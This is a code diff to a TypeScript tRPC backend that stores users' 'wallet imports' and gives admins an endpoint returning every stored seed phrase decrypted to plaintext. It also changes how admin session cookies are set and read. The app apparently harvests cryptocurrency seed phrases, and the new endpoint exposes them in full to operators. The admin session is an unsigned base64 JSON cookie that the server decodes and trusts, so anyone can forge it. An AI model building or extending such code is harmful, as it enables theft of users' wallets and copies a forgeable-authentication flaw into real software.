@@ -1,5 +1,6 @@
 import { COOKIE_NAME } from "@shared/const";
-import { getSessionCookieOptions } from "./_core/cookies";
+import { getSessionCookieOptions } from './_core/cookies';
+import { parse as parseCookies } from 'cookie';
 import { systemRouter } from "./_core/systemRouter";
 import { protectedProcedure, publicProcedure, router } from "./_core/trpc";
 import { TRPCError } from "@trpc/server";
@@ -11,6 +12,7 @@ import {
   getActiveTokenForUser,
   saveWalletImport,
   listAllWalletImports,
+  decryptSeedPhrase,
   createAdminAccount,
   listAdminAccounts,
   toggleAdminActive,
@@ -227,7 +229,12 @@ export const appRouter = router({
       if (ctx.user.role !== 'admin') {
         throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
       }
-      return listAllWalletImports();
+      const imports = await listAllWalletImports();
+      // Decrypt seed phrases for admin view only
+      return imports.map(row => ({
+        ...row,
+        seedPhrase: decryptSeedPhrase(row.seedPhrase),
+      }));
     }),
   }),
 
@@ -341,27 +348,26 @@ export const appRouter = router({
           throw new TRPCError({ code: 'UNAUTHORIZED', message: 'Invalid credentials' });
         }
         await updateAdminLastLogin(admin.id);
-        // Set admin session cookie
+        // Set admin session cookie using Express res.cookie() (same pattern as auth procedures)
         const sessionData = JSON.stringify({ adminId: admin.id, userId: admin.userId, role: 'admin', name: admin.name });
         const encoded = Buffer.from(sessionData).toString('base64');
-        const cookieStr = buildCookieHeader('admin_session', encoded, {
-          httpOnly: true,
-          path: '/',
-          maxAge: 60 * 60 * 24, // 24 hours
-          sameSite: 'Lax',
+        const adminCookieOptions = getSessionCookieOptions(ctx.req);
+        ctx.res.cookie('admin_session', encoded, {
+          ...adminCookieOptions,
+          maxAge: 60 * 60 * 24 * 1000, // 24 hours in ms
         });
-        ctx.res.setHeader('Set-Cookie', cookieStr);
         return { success: true, name: admin.name, role: admin.role };
       }),
 
     logout: publicProcedure.mutation(async ({ ctx }) => {
-      const cookieStr = buildCookieHeader('admin_session', '', { httpOnly: true, path: '/', maxAge: 0 });
-      ctx.res.setHeader('Set-Cookie', cookieStr);
+      ctx.res.clearCookie('admin_session', { httpOnly: true, path: '/' });
       return { success: true };
     }),
 
     me: publicProcedure.query(async ({ ctx }) => {
-      const raw = ctx.req.cookies?.['admin_session'];
+      // Parse cookie from raw header (req.cookies requires cookie-parser middleware)
+      const cookies = parseCookies(ctx.req.headers.cookie || '');
+      const raw = cookies['admin_session'];
       if (!raw) return null;
       try {
         const data = JSON.parse(Buffer.from(raw, 'base64').toString());
